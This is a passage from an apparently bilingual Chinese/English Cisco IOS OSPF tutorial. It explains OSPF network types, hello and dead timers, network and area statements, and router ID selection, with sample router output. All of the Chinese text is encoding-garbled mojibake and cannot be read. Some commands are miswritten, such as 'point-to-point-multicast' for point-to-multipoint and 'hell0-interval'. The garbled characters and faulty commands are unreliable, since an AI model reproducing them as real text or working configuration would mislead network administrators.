interfaceå‘½ä»¤çš„è¾“å‡ºã€‚ R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 150.1.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type NON_BROADCAST, Cost: 64 Transmit Delay is 1 sec, State DR, Priority 1 Designated Router (ID) 2.2.2.2, Interface address 150.1.1.2 Backup Designated Router (ID) 1.1.1.1, Interface address 150.1.1.1 Timer intervals configured, Hello 30, Dead 120, Wait 120, Retransmit 5 oob-resync timeout 120 Hello due in 00:00:00 Supports Link-local Signaling (LLS) Index 2&#x2F;2, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 2, maximum is 2 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 1.1.1.1 (Backup Designated Router) Suppress Hello for 0 neighbor(s)ä¸€æ¡ç‚¹å¯¹ç‚¹è¿æ¥, ç®€å•æ¥è¯´å°±æ˜¯ä¸€æ¡ä¸¤ä¸ªç«¯ç‚¹ä¹‹é—´çš„è¿æ¥ã€‚ P2P è¿æ¥çš„å®ä¾‹ï¼ŒåŒ…æ‹¬é‡‡ç”¨ HDLC åŠ PPP å°è£…çš„ç‰©ç† WAN æ¥å£ï¼Œä»¥åŠ FR å’Œ ATM çš„ç‚¹å¯¹ç‚¹å­æ¥å£ã€‚OSPFç‚¹å¯¹ç‚¹ç»„ç½‘ç±»å‹ä¸­ï¼Œä¸ä¼šé€‰ä¸¾å‡º DR å’ŒBDRã€‚åœ¨ P2P ç±»å‹ç½‘ç»œä¸Šï¼Œ OSPF æ¯10ç§’å‘å‡ºHelloæ•°æ®åŒ…ã€‚åœ¨è¿™äº›ç½‘ç»œä¸Šï¼Œâ€æ­»äº¡â€œé—´éš”æ˜¯Helloé—´éš”çš„4å€ï¼Œä¹Ÿå°±æ˜¯40ç§’ï¼ˆA Point-to-Point(P2P) connection is simply a connection between two endpoints only. Examples of P2P connections include physical WAN interfaces using HDLC and PPP encapsulation, and Frame Relay(FR) and Asynchronous Transfer Mode(ATM) Point-to-Point subinterfaces. No DR or BDR is elected on OSPF Point-to-Point network types. By default, OSPF sends Hello packets out every 10 seconds on P2P network types. The â€œdeadâ€ interval on these network types is four times the Hello interval, which is 40 secondsï¼‰ã€‚ä¸‹é¢çš„è¾“å‡ºæ¼”ç¤ºäº†åœ¨ä¸€æ¡ P2P é“¾è·¯ä¸Šçš„show ip ospf interfaceå‘½ä»¤çš„è¾“å‡ºã€‚ R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 150.1.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type POINT_TO_POINT, Cost: 64 Transmit Delay is 1 sec, State POINT_TO_POINT Timer intervals configured, Hello 10, Dead 40, Wait 40, Retransmit 5 oob-resync timeout 40 Hello due in 00:00:03 Supports Link-local Signaling (LLS) Index 2&#x2F;2, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 1, maximum is 1 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 1.1.1.1 Suppress Hello for 0 neighbor(s)å¹¿æ’­ç±»å‹ç½‘ç»œï¼Œæ˜¯æŒ‡é‚£äº›åŸç”Ÿæ”¯æŒå¹¿æ’­å’Œå¤šæ’­æµé‡çš„ç½‘ç»œï¼Œæœ€å¸¸è§ä¾‹å­å°±æ˜¯ä»¥å¤ªç½‘ã€‚å°±å¦‚åŒåœ¨éå¹¿æ’­ç½‘ç»œä¸­ä¸€æ ·ï¼Œ OSPF ä¹Ÿä¼šåœ¨å¹¿æ’­ç½‘ç»œä¸Šé€‰ä¸¾ä¸€å° DR åŠ&#x2F;æˆ– BDR ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ OSPF æ¯éš”10ç§’å‘å‡ºHelloæ•°æ®åŒ…ï¼Œè€Œå¦‚åœ¨4å€ Hello é—´éš”ä¸­æ²¡æœ‰æ”¶åˆ°Helloæ•°æ®åŒ…ï¼Œå°±å®£å‘Šé‚»å±…â€æ­»äº¡â€œã€‚ä¸‹é¢çš„è¾“å‡ºæ¼”ç¤ºäº†åœ¨ä¸€ä¸ªFastEthernetæ¥å£ä¸Šshow ip ospf interfaceå‘½ä»¤çš„è¾“å‡ºã€‚ R2#show ip ospf interface FastEthernet0&#x2F;0FastEthernet0&#x2F;0 is up, line protocol is up Internet Address 192.168.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type BROADCAST, Cost: 64 Transmit Delay is 1 sec, State BDR, Priority 1 Designated Router (ID) 192.168.1.3, Interface address 192.168.1.3 Backup Designated Router (ID) 2.2.2.2, Interface address 192.168.1.2 Timer intervals configured, Hello 10, Dead 40, Wait 40, Retransmit 5 oob-resync timeout 40 Hello due in 00:00:04 Supports Link-local Signaling (LLS) Index 1&#x2F;1, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 1, maximum is 1 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 192.168.1.3 (Designated Router) Suppress Hello for 0 neighbor(s)ç‚¹å¯¹å¤šç‚¹æ˜¯ä¸€ç§éé»˜è®¤ OSPF ç»„ç½‘ç±»å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ­¤ç§ç»„ç½‘ç±»å‹å¿…é¡»ä½¿ç”¨æ¥å£é…ç½®å‘½ä»¤ip ospf network point-to-point-multicast [non-broadcast]æ‰‹åŠ¨è¿›è¡Œé…ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥å‘½ä»¤é»˜è®¤åº”ç”¨äºä¸€ä¸ªå¹¿æ’­å‹ç‚¹å¯¹å¤šç‚¹ç±»å‹ç½‘ç»œçš„ã€‚æ­¤é»˜è®¤ç»„ç½‘ç±»å‹å…è®¸ OSPF é‡‡ç”¨å¤šæ’­æ•°æ®åŒ…æ¥åŠ¨æ€åœ°å‘ç°å…¶é‚»å±…è·¯ç”±å™¨ã€‚æ­¤å¤–åœ¨å¹¿æ’­å‹ç‚¹å¯¹å¤šç‚¹ç½‘ç»œç±»å‹ä¸Šï¼Œä¸è¿›è¡ŒDR&#x2F;BDRé€‰ä¸¾ï¼ˆPoint-to-Multipoint is a non-default OSPF network type. In other words, this network type must be configured manually using the ip ospf network point-to-multipoint [non-broadcast] interface configuration command. By default, this command defaults to a Broadcast Point-to-Multipoint network type. This default network type allows OSPF to use Multicast packets to discover its neighbour routers. In addition, there is no DR&#x2F;BDR election held on Broadcast Point-to-Multipoint network typesï¼‰ã€‚ å…³é”®å­—[non-broadcast]å°†ç‚¹å¯¹å¤šç‚¹ç½‘ç»œé…ç½®ä¸ºéå¹¿æ’­ç‚¹å¯¹å¤šç‚¹ç½‘ç»œã€‚è¿™æ ·åšå°±è¦æ±‚é™æ€çš„ OSPF é‚»å±…é…ç½®ï¼Œå› ä¸ºæ­¤æ—¶ OSPF ä¸ä¼šä½¿ç”¨å¤šæ’­æ¥åŠ¨æ€åœ°å‘ç°å…¶é‚»å±…è·¯ç”±å™¨ã€‚æ­¤å¤–ï¼Œè¿™ç§ç½‘ç»œç±»å‹ä¸è¦æ±‚ä¸ºæŒ‡å®šç½‘æ®µè¿›è¡Œ DR åŠ&#x2F;æˆ– BDR é€‰ä¸¾ã€‚æ­¤ç§ç»„ç½‘çš„ä¸»è¦ç”¨é€”ï¼Œå³å…è®¸åˆ†é…é‚»å±…å¼€é”€åˆ°é‚»å±…è·¯ç”±å™¨ï¼Œè€Œéä½¿ç”¨æŒ‡å®šç»™æ¥å£çš„å¼€é”€ï¼Œä½œä¸ºé‚£äº›è‡ªæ‰€æœ‰é‚»å±…å¤„æ”¶åˆ°çš„è·¯ç”±çš„å¼€é”€ï¼ˆThe [non-broadcast] keyword configures the Point-to-Multipoint network type as a Non-Broadcast Point-to-Multipoint network. This requires static OSPF neighbour configuration, as OSPF will not use Multicast to discover dynamically its neighbour routers. Additionally, this network type does not require the election of a DR and&#x2F;or a BDR router for the designated segment. The primary use of this network type is to allow neighbor costs to be assigned to neighbors instead of using the interface-assigned cost for routes received from all neighborsï¼‰ã€‚ ç‚¹å¯¹å¤šç‚¹ç»„ç½‘ç±»å‹ï¼Œå…¸å‹åœ°ç”¨äºéƒ¨åˆ†å…¨é€šè¾å°„çŠ¶éå¹¿æ’­å¤šè·¯è®¿é—®ç½‘ç»œã€‚ä¸è¿‡æ­¤ç§ç»„ç½‘ç±»å‹ä¹Ÿå¯æŒ‡å®šç»™è¯¸å¦‚å¹¿æ’­å¤šè·¯è®¿é—®ç½‘ç»œï¼ˆæ¯”å¦‚ä»¥å¤ªç½‘ï¼‰ç­‰çš„å…¶å®ƒç±»å‹ç½‘ç»œï¼ˆThe Point-to-Multipoint network type is typically used in partial-mesh hub-and-spoke Non-Broadcast Multi-Access(NBMA) networks. However, this network type can also be specified for other networks, such as Broadcast Multi-Access networks(e.g., Ethernet)ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œåœ¨ç‚¹å¯¹å¤šç‚¹ç½‘ç»œä¸Šï¼Œ OSPF æ¯30ç§’å‘å‡ºä¸€ä¸ªHelloæ•°æ®åŒ…ã€‚é»˜è®¤æ­»äº¡é—´éš”æ˜¯Helloé—´éš”çš„4å€ï¼Œä¹Ÿå°±æ˜¯120ç§’ã€‚ ä¸‹é¢çš„è¾“å‡ºæ¼”ç¤ºäº†åœ¨ä¸€ä¸ªç»æ‰‹åŠ¨é…ç½®ä¸ºç‚¹å¯¹å¤šç‚¹ç½‘ç»œçš„å¸§ä¸­ç»§ä¸²è¡Œæ¥å£ä¸Šçš„show ip ospf interfaceå‘½ä»¤çš„è¾“å‡ºã€‚ R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 150.1.1.2&#x2F;24, Area 0 Process ID 2, Router ID 2.2.2.2, Network Type POINT_TO_MULTIPOINT, Cost: 64 Transmit Delay is 1 sec, State POINT_TO_MULTIPOINT Timer intervals configured, Hello 30, Dead 120, Wait 120, Retransmit 5 oob-resync timeout 120 Hello due in 00:00:04 Supports Link-local Signaling (LLS) Index 2&#x2F;2, flood queue length 0 Next 0x0(0)&#x2F;0x0(0) Last flood scan length is 1, maximum is 2 Last flood scan time is 0 msec, maximum is 0 msec Neighbor Count is 1, Adjacent neighbor count is 1 Adjacent with neighbor 1.1.1.1 Suppress Hello for 0 neighbor(s)OSPFè¦æ±‚é“¾è·¯ä¸Šä¸¤å°è·¯ç”±å™¨ç»„ç½‘ç±»å‹ä¸€è‡´ï¼ˆä¸€è‡´çš„æ„æ€æ˜¯ä¸¤å°è·¯ç”±å™¨è¦ä¹ˆéƒ½è¿›è¡Œé€‰ä¸¾è¦ä¹ˆéƒ½ä¸è¿›è¡Œé€‰ä¸¾ï¼‰çš„ä¸»è¦åŸå› åœ¨äºè®¡æ—¶å™¨çš„æ•°å€¼ã€‚å°±åƒä¸Šé¢å„ä¸ªè¾“å‡ºä¸­æ¼”ç¤ºçš„é‚£æ ·ï¼Œä¸åŒç»„ç½‘ç±»å‹é‡‡ç”¨äº†ä¸åŒHelloæ•°æ®åŒ…å‘é€åŠæ­»äº¡è®¡æ—¶å™¨é—´éš”ã€‚ä¸ºæˆåŠŸå»ºç«‹ä¸€ä¸ª OSPF é‚»æ¥å…³ç³»ï¼Œåœ¨ä¸¤å°è·¯ç”±å™¨ä¸Šè¿™äº›æ•°å€¼å¿…é¡»åŒ¹é…ã€‚ æ€ç§‘ IOS è½¯ä»¶å…è®¸é€šè¿‡ä½¿ç”¨æ¥å£é…ç½®å‘½ä»¤ip ospf hello-interval &lt;1-65535&gt;åŠip ospf dead-interval [&lt;1-65535&gt;|minimal]ï¼Œå¯¹é»˜è®¤OSPF Helloæ•°æ®åŒ…åŠæ­»äº¡è®¡æ—¶å™¨è¿›è¡Œä¿®æ”¹ã€‚ip ospf hell0-interval &lt;1-65535&gt;å‘½ä»¤ç”¨äºæŒ‡å®šHelloé—´éš”çš„ç§’æ•°ã€‚åœ¨æ‰§è¡Œè¯¥å‘½ä»¤åï¼Œè½¯ä»¶ä¼šè‡ªåŠ¨å°†æ­»äº¡é—´éš”é…ç½®ä¸ºæ‰€é…ç½®çš„HelloåŒ…é—´éš”çš„4å€ã€‚æ¯”å¦‚ï¼Œå‡å®šæŸå°è·¯ç”±å™¨åšäº†å¦‚ä¸‹é…ç½®ã€‚ R2(config)#interface Serial0&#x2F;0R2(config-if)#ip ospf hello-interval 1R2(config-if)#exité€šè¿‡åœ¨ä¸Šé¢çš„R2ä¸Šå°†Helloæ•°æ®åŒ…é—´éš”è®¾ç½®ä¸º1, æ€ç§‘ IOS è½¯ä»¶å°±ä¼šè‡ªåŠ¨çš„å°†é»˜è®¤æ­»äº¡è®¡æ—¶å™¨è°ƒæ•´ä¸ºHelloé—´éš”çš„4å€ï¼Œå°±æ˜¯4ç§’ã€‚ä¸‹é¢çš„è¾“å‡ºå¯¹æ­¤è¿›è¡Œäº†æ¼”ç¤ºã€‚ R2#show ip ospf interface Serial0&#x2F;0Serial0&#x2F;0 is up, line protocol is up Internet Address 10.0.2.4&#x2F;24, Area 2 Process ID 4, Router ID 4.4.4.4, Network Type POINT_TO_POINT, Cost: 64 Transmit Delay is 1 sec, State POINT_TO_POINT Timer intervals configured, Hello 1, Dead 4, Wait 4, Retransmit 5 oob-resync timeout 40 Hello due in 00:00:00â€¦[Truncated Output]é…ç½®OSPFOSPF Configuration æœ¬èŠ‚å¯¹ OSPF é…ç½®åŸºç¡€è¿›è¡Œè¯´æ˜ã€‚ åœ¨æ€ç§‘ IOS è½¯ä»¶ä¸­å¼€å¯OSPFEnabling OSPF in Cisco IOS Software åœ¨æ€ç§‘ IOS è½¯ä»¶ä¸­ï¼Œé€šè¿‡ä½¿ç”¨å…¨å±€é…ç½®å‘½ä»¤router ospf [process id]å¼€å¯ OSPF ã€‚å…³é”®å­—[process id]æ˜¯æœ¬åœ°æœ‰æ•ˆçš„(locally sinificant)ï¼Œé‚»æ¥å…³ç³»çš„å»ºç«‹æ— éœ€ç½‘ç»œä¸­æ‰€æœ‰è·¯ç”±å™¨çš„è¿›ç¨‹å·ä¸€è‡´ã€‚è¿ç”¨æœ¬åœ°æœ‰æ•ˆçš„è¿›ç¨‹å·ï¼Œå…è®¸åœ¨åŒä¸€å°è·¯ç”±å™¨ä¸Šé…ç½®å¤šä¸ª OSPF å®ä¾‹ã€‚ OSPFè¿›ç¨‹å·æ˜¯ä¸€ä¸ª1ä¸65535ä¹‹é—´çš„æ•´æ•°ã€‚æ¯ä¸ª OSPF è¿›ç¨‹éƒ½ç»´æŠ¤ç€å…¶ç‹¬ç«‹é“¾è·¯çŠ¶æ€æ•°æ®åº“ï¼ˆ LSDB ï¼‰ï¼›ä½†æ˜¯ï¼Œæ‰€æœ‰è·¯ç”±éƒ½æ”¾è¿›çš„æ˜¯åŒä¸€ IP è·¯ç”±è¡¨ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹é…ç½®åœ¨è·¯ç”±å™¨ä¸Šçš„å„ä¸ªå•ç‹¬ OSPF è¿›ç¨‹ï¼Œå¹¶æ²¡æœ‰å„è‡ªå”¯ä¸€çš„ IP è·¯ç”±è¡¨ã€‚ åœ¨æ€ç§‘ IOS è½¯ä»¶æ—©æœŸç‰ˆæœ¬ä¸­ï¼Œå¦‚è·¯ç”±å™¨ä¸Šæ²¡æœ‰è‡³å°‘ä¸€ä¸ªçš„æ¥å£é…ç½®äº†æœ‰æ•ˆ IP åœ°å€ä¸”å¤„äºup&#x2F;upçŠ¶æ€ï¼Œå°±æ— æ³•å¼€å¯ OSPF ã€‚æ­¤é™åˆ¶åœ¨å½“å‰ç‰ˆæœ¬æ€ç§‘ IOS è½¯ä»¶ä¸­å»é™¤äº†ã€‚å‡å¦‚è·¯ç”±å™¨æ²¡æœ‰æ¥å£é…ç½®äº†æœ‰æ•ˆ IP åœ°å€ä¸”å¤„äºup&#x2F;upçŠ¶æ€ï¼Œé‚£ä¹ˆæ€ç§‘ IOS å°†åˆ›å»ºå‡ºä¸€ä¸ªæ¥è¿‘æ•°æ®åº“ï¼ˆa Proximity Database, PDBï¼‰å¹¶å…è®¸åˆ›å»ºå‡ºè¿›ç¨‹ã€‚ä½†æ˜¯ï¼Œè¦è®°ä½é™¤éé€‰å®šè·¯ç”±å™¨ ID ï¼Œè¯¥è¿›ç¨‹å°±æ˜¯éæ´»åŠ¨çš„è¿›ç¨‹ï¼Œè€Œè·¯ç”±å™¨ ID çš„é€‰å®šï¼Œå¯é€šè¿‡ä¸‹é¢ä¸¤ç§æ–¹å¼å®Œæˆã€‚ åœ¨æŸä¸ªæ¥å£ä¸Šé…ç½®ä¸€ä¸ªæœ‰æ•ˆ IP åœ°å€ï¼Œå¹¶å°†è¯¥æ¥å£å¼€å¯ä½¿ç”¨å‘½ä»¤router-idä¸ºè¯¥è·¯ç”±å™¨æ‰‹åŠ¨é…ç½®ä¸€ä¸ª ID ï¼ˆè§ä¸‹ï¼‰ä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œçœ‹çœ‹ä¸‹é¢çš„æ‰€æœ‰æ¥å£éƒ½å…³é—­çš„è·¯ç”±å™¨ã€‚ R3#show ip interface briefInterface IP-Address OK? Method Status ProtocolFastEthernet0&#x2F;0 unassigned YES manual administratively down downSerial0&#x2F;0 unassigned YES NVRAM administratively down downSerial0&#x2F;1 unassigned YES unset administratively down downæ¥ç€ï¼Œä½¿ç”¨å…¨å±€é…ç½®å‘½ä»¤router ospf [process id]åœ¨è¯¥è·¯ç”±å™¨ä¸Šå¼€å¯äº† OSPF ï¼Œ å¦‚ä¸‹é¢è¾“å‡ºæ‰€ç¤ºã€‚ R3(config)#router ospf 1R3(config-router)#exitåŸºäºæ­¤é…ç½®ï¼Œæ€ç§‘ IOS è½¯ä»¶åˆ†é…ç»™è¯¥è¿›ç¨‹ä¸€ä¸ªé»˜è®¤0.0.0.0çš„è·¯ç”±å™¨ ID ï¼Œå¦‚ä¸‹é¢show ip protocolså‘½ä»¤çš„è¾“å‡ºæ‰€ç¤ºã€‚ R3#show ip protocolsRouting Protocol is â€œospf 1â€ Outgoing update filter list for all interfaces is not set Incoming update filter list for all interfaces is not set Router ID 0.0.0.0 Number of areas in this router is 0. 0 normal 0 stub 0 nssa Maximum path: 4 Routing for Networks:Reference bandwidth unit is 100 mbps Routing Information Sources: Gateway Distance Last Update Distance: (default is 110)ä½†æ˜¯ï¼Œå‘½ä»¤show ip ospf [process id]æ­ç¤ºå‡ºè¯¥è¿›ç¨‹å®é™…ä¸Šå¹¶ä¸æ˜¯æ´»åŠ¨çš„ï¼Œä¸”è¡¨æ˜éœ€è¦é…ç½®ä¸€ä¸ªè·¯ç”±å™¨ ID ï¼Œ å…¶è¾“å‡ºå¦‚ä¸‹é¢æ‰€ç¤ºã€‚ R3#show ip ospf 1%OSPF: Router process 1 is not running, please configure a router-idå¼€å¯æ¥å£æˆ–ç½‘ç»œçš„ OSPF è·¯ç”±Enabling OSPF Routing for Interfaces or Networks åœ¨å¼€å¯ OSPF åï¼Œå°±å¯ä»¥æ‰§è¡Œä¸¤ä¸ªæ“ä½œï¼Œæ¥ä¸ºè·¯ç”±å™¨ä¸Šä¸€ä¸ªæˆ–æ›´å¤šçš„ç½‘ç»œæˆ–æ¥å£å¼€å¯ OSPF è·¯ç”±ã€‚è¿™ä¸¤ä¸ªæ“ä½œå¦‚ä¸‹ã€‚ ä½¿ç”¨è·¯ç”±å™¨é…ç½®å‘½ä»¤(router configuration command)[network] [wildcard] area [area id]ä½¿ç”¨æ¥å£é…ç½®å‘½ä»¤ip ospf [process id] area [area id]ä¸ EIGRP ä¸åŒï¼Œ OSPF å¼ºåˆ¶ä½¿ç”¨åæ©ç ä¸”å¿…é¡»é…ç½®åæ©ç ; ä½†ä¸åœ¨ EIGRP ä¸­çš„æƒ…å†µä¸€æ ·ï¼Œåæ©ç æä¾›äº†åŒæ ·çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯åŒ¹é…æŒ‡å®šèŒƒå›´ä¸­çš„æ¥å£ï¼ˆunlike EIGRP, the wildcard is mandatory in OSPF and must be configured; however, as is the case with EIGRP, it serves the same function in that it matches interfaces within the range specifiedï¼‰ã€‚æ¯”å¦‚ï¼Œè¯­å¥network 10.0.0.0 0.255.255.255 area 0ï¼Œå°±ä¼šå¯¹10.0.0.1&#x2F;30ã€10.5.5.1&#x2F;24, ç”šè‡³10.10.10.1&#x2F;25è¿™æ ·çš„ IP åœ°å€å’Œå­ç½‘æ©ç ç»„åˆçš„æ¥å£ï¼Œå¼€å¯ OSPF è·¯ç”±ã€‚åŸºäºè¯¥ OSPF ç½‘ç»œé…ç½®ï¼Œè¿™äº›æ¥å£éƒ½ä¼šè¢«åˆ†é…åˆ° 0 å·åŒºåŸŸã€‚ æ³¨æ„ï¼š OSPFåæ©ç å¯ä»¥ä¸ä¼ ç»Ÿå­ç½‘æ©ç åŒæ ·æ ¼å¼æ•²å…¥ï¼Œæ¯”å¦‚network 10.0.0.0 255.0.0.0 area 0ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ€ç§‘ IOS è½¯ä»¶å°±ä¼šå°†å­ç½‘æ©ç ç¿»è½¬ï¼Œå°†å¾—åˆ°çš„åæ©ç è¾“å…¥åˆ°è¿è¡Œé…ç½®ï¼ˆthe running configurationï¼‰ã€‚å¦å¤–è¦è®°ä½OSPFä¹Ÿæ”¯æŒä½¿ç”¨å…¨ 1s å’Œå…¨ 0s åæ©ç ï¼Œæ¥å¯¹æŸä¸ªæŒ‡å®šæ¥å£å¼€å¯OSPFã€‚è¿™æ ·çš„é…ç½®åœ¨æŸä¸ªç‰¹å®šæ¥å£ä¸Šå¼€å¯ OSPF ï¼Œä½†è·¯ç”±å™¨é€šå‘Šé…ç½®åœ¨è¯¥æ¥å£è‡ªèº«çš„å®é™…å­ç½‘æ©ç ï¼ˆthis configuration enables OSPF on a paricular interface but the router advertises the actual subnet mask configured on the interface itselfï¼‰ã€‚ åœ¨æ‰§è¡Œäº†network [network] [wildcast] area [area id]å‘½ä»¤åï¼Œè·¯ç”±å™¨å°±åœ¨ä¸æŒ‡å®šç½‘ç»œå’Œåæ©ç ç»„åˆåŒ¹é…çš„é‚£äº›æ¥å£ä¸Šå‘å‡ºHelloæ•°æ®åŒ…ï¼Œæ¥å°è¯•å‘ç°é‚»å±…è·¯ç”±å™¨ã€‚æ¥ç€åœ¨ OSPF æ•°æ®åº“äº¤æ¢æœŸé—´ï¼Œå°†è¿æ¥å­ç½‘é€šå‘Šç»™ä¸€å°æˆ–æ›´å¤šçš„é‚»å±…è·¯ç”±å™¨ï¼Œæœ€ç»ˆï¼Œå®ƒä»¬å°†æ‰€æœ‰å­ç½‘ä¿¡æ¯éƒ½è¢«åŠ å…¥åˆ°è¿™äº› OSPF è·¯ç”±å™¨çš„ OSPF é“¾è·¯çŠ¶æ€æ•°æ®åº“ï¼ˆOSPF LSDBï¼‰ä¸­ã€‚ åœ¨å‘½ä»¤network [network] [wildcard] area [area id]ä¹‹åï¼Œè·¯ç”±å™¨åˆå¯¹æœ€å…·ä½“æ¡ç›®åšå‡ºåŒ¹é…ï¼Œä»¥å†³å®šå°†æ¥å£è¦åˆ†é…ç»™çš„åŒºåŸŸã€‚ä½œä¸ºå®ä¾‹ï¼Œæƒ³æƒ³ä¸‹é¢è¿™äº› OSPF ç½‘ç»œè¯­å¥ã€‚ ç¬¬ä¸€æ¡ç½‘ç»œé…ç½®è¯­å¥ï¼šnetwork 10.0.0.0 0.255.255.255 area 0ç¬¬äºŒæ¡ï¼šnetwork 10.1.0.0 0.0.255.255 area 1ç¬¬ä¸‰æ¡ï¼šnetwork 10.1.1.0 0.0.0.255 area 2ç¬¬å››æ¡ï¼šnetwork 10.1.1.1 0.0.0.0 area 3ç¬¬äº”æ¡ï¼šnetwork 0.0.0.0 0.0.0.0 area 4æŒ‰ç…§è·¯ç”±å™¨ä¸Šçš„æ­¤ç§é…ç½®ï¼ŒåŒæ—¶è·¯ç”±å™¨ä¸Šåˆé…ç½®äº†å¦‚ä¸‹è¡¨12.1ä¸­å±•ç¤ºçš„è¿™äº›ç¯å›æ¥å£ã€‚ æ¥å£ IPåœ°å€&#x2F;æ©ç Loopback 0 10.0.0.1/32Loopback 1 10.0.1.1/32Loopback 2 10.1.0.1/32Loopback 3 10.1.1.1/32Loopback 4 10.2.0.1/32å°±åƒå‰é¢æŒ‡å‡ºçš„é‚£æ ·ï¼Œåœ¨æ‰§è¡Œäº†network [network] [wildcard] area [area id]å‘½ä»¤åï¼Œè·¯ç”±å™¨åŒ¹é…æœ€å…·ä½“çš„ç½‘ç»œæ¡ç›®ï¼ˆæœ€å°çš„ç½‘ç»œï¼‰ï¼Œæ¥å†³å®šè¯¥æ¥å£åº”åˆ†é…åˆ°çš„åŒºåŸŸã€‚å¯¹äºåœ¨è·¯ç”±å™¨ä¸Šçš„ç½‘ç»œé…ç½®è¯­å¥åŠå·²é…ç½®çš„æ¥å£ï¼Œå‘½ä»¤show ip ospf interface briefä¼šæ˜¾ç¤ºå‡ºè¿™äº›æ¥å£éƒ½åˆ†é…ç»™äº†ä»¥ä¸‹ OSPF åŒºåŸŸã€‚ R1#show ip ospf interface briefInterface PID Area IP Address&#x2F;Mask Cost State Nbrs F&#x2F;CLo4 1 0 10.2.0.1&#x2F;32 1 LOOP 0&#x2F;0Lo1 1 0 10.0.1.1&#x2F;32 1 LOOP 0&#x2F;0Lo0 1 0 10.0.0.1&#x2F;32 1 LOOP 0&#x2F;0Lo2 1 1 10.1.0.1&#x2F;32 1 LOOP 0&#x2F;0Lo3 1 3 10.1.1.1&#x2F;32 1 LOOP 0&#x2F;0æ³¨æ„ï¼š åœ¨è¿è¡Œé…ç½®ï¼ˆthe running configurationï¼‰ä¸­ï¼Œæ— éœ€è€ƒè™‘ç½‘ç»œè¯­å¥æ•²å…¥é¡ºåºï¼Œè·¯ç”±å™¨çš„show running-configè¾“å‡ºä¸­æœ€å…·ä½“çš„ç½‘ç»œæ¡ç›®ï¼Œå§‹ç»ˆåˆ—åœ¨å‰é¢ã€‚ æ¥å£é…ç½®å‘½ä»¤ip ospf [process id] area [area id]ä»¤åˆ°æ— éœ€ä½¿ç”¨è·¯ç”±å™¨é…ç½®å‘½ä»¤network [network] [wildcard] area [area id]ã€‚è¯¥å‘½ä»¤å¯¹æŸä¸ªæŒ‡å®šæ¥å£å¼€å¯ OSPF è·¯ç”±ï¼ŒåŒæ—¶å°†è¯¥æ¥å£åˆ†é…ç»™æŒ‡å®š OSPF åŒºåŸŸã€‚è¿™ä¸¤ä¸ªå‘½ä»¤å®ŒæˆåŒæ ·çš„åŸºæœ¬åŠŸèƒ½ï¼Œä¸”å¯äº’æ¢ä½¿ç”¨ã€‚ æ­¤å¤–ï¼Œæ¯”å¦‚æœ‰ä¸¤å°è·¯ç”±å™¨æ˜¯èƒŒé èƒŒè¿æ¥ï¼ˆconnected back-to-backï¼‰ï¼Œä¸€å°ä½¿ç”¨æ¥å£é…ç½®å‘½ä»¤ip ospf [process id] area [area id]è¿›è¡Œäº†é…ç½®ï¼Œè€Œå…¶é‚»å±…è·¯ç”±å™¨ä½¿ç”¨è·¯ç”±å™¨é…ç½®å‘½ä»¤network [network] [wildcard] area [area id]è¿›è¡Œäº†é…ç½®ï¼Œå‡è®¾ä¸¤ä¸ªåŒºåŸŸ IDs ç›¸åŒï¼Œé‚£ä¹ˆä¸¤å°è·¯ç”±å™¨å°†æˆåŠŸå»ºç«‹ OSPF é‚»æ¥å…³ç³»ã€‚ OSPFåŒºåŸŸOSPF Areas OSPFåŒºåŸŸå·æ—¢å¯ä»¥é…ç½®ä¸ºä¸€ä¸ª0åˆ°4294967295ä¹‹é—´çš„æ•´æ•°ï¼Œä¹Ÿå¯ä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶è¡¨ç¤ºæ³•ï¼ˆä¹Ÿå°±æ˜¯é‡‡ç”¨ IP åœ°å€æ ¼å¼ï¼‰ã€‚ä¸ OSPF è¿›ç¨‹å·ä¸åŒï¼Œä¸ºå»ºç«‹é‚»æ¥å…³ç³»ï¼Œ OSPF åŒºåŸŸå·å¿…é¡»åŒ¹é…ã€‚æœ€å¸¸è§ OSPF åŒºåŸŸé…ç½®ç±»å‹ä¸ºä½¿ç”¨ä¸€ä¸ªæ•´æ•°æ¥æŒ‡å®š OSPF åŒºåŸŸã€‚ç¡®ä¿å¯¹æ”¯æŒçš„ä¸¤ç§åŒºåŸŸé…ç½®æ–¹å¼éƒ½è¦ç†Ÿæ‚‰ã€‚ OSPFè·¯ç”±å™¨IDOSPF Router ID ä¸ºä»¤åˆ° OSPF åœ¨æŸä¸ªç½‘ç»œä¸Šè¿è¡Œèµ·æ¥ï¼Œæ‰€æœ‰è·¯ç”±å™¨éƒ½å¿…é¡»æœ‰ä¸ªå”¯ä¸€èº«ä»½ç¼–å·ï¼ˆa unique identifying numberï¼‰ï¼Œä¸”åœ¨ OSPF ç¯å¢ƒä¸‹è¦ç”¨åˆ°è·¯ç”±å™¨ ID ã€‚ åœ¨å†³å®š OSPF è·¯ç”±å™¨ ID æ—¶ï¼Œæ€ç§‘ IOS é€‰ç”¨æ‰€é…ç½®ç¯å›æ¥å£ä¸­æœ€é«˜çš„ IP 